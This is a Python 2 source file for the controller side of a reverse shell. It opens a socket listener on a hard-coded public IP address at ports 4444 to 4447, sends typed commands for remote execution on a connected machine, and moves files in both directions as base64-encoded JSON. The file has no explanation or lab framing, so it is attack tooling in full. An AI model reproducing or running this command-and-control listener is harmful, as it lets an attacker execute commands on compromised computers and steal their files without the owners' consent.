
import socket
import json
import base64


class Listener():

	def __init__(self,ip,port):
		listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		listener.bind((ip,port))
		listener.listen(0)
		print "[+] Waiting for Incoming Connection"
		self.connection,address = listener.accept()
		print "[+] Got a Connection from " + str(address)

	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(10240000)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_remotely(self,command):
		self.reliable_send(command)
		if command[0] == "exit":
			self.connection.close()
			exit()

		return self.reliable_receive()

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Download Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def run(self):

		while True:
			command = raw_input(">> ")
			

			try:
				command=command.split(' ')

				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)
					
				result = self.execute_remotely(command)
		
				if command[0] == "download" and "[-] Error " not in result:
					result = self.write_file(command[1],result)
					
			except Exception:
				result = "[-] Error during command execution"
				
			print result



if __name__ == '__main__':
    l=[1,2,3,4,5]
    while True:
        
        try:
            argument = int(raw_input("enter the value "))
            if argument is l[0]:
                my_listener1 = Listener("134.209.82.16",4444)
                my_listener1.run()                
                
            elif argument is l[1]:
                my_listener2 = Listener("134.209.82.16",4445)
                my_listener2.run()
                
            elif argument is l[2]:
                my_listener3 = Listener("134.209.82.16",4446)   
                my_listener3.run()
              
            elif argument is l[3]:
                my_listener4 = Listener("134.209.82.16",4447)
                my_listener4.run()
    
            elif argument not in l:
                print "wrong input"

        except Exception:
            continue

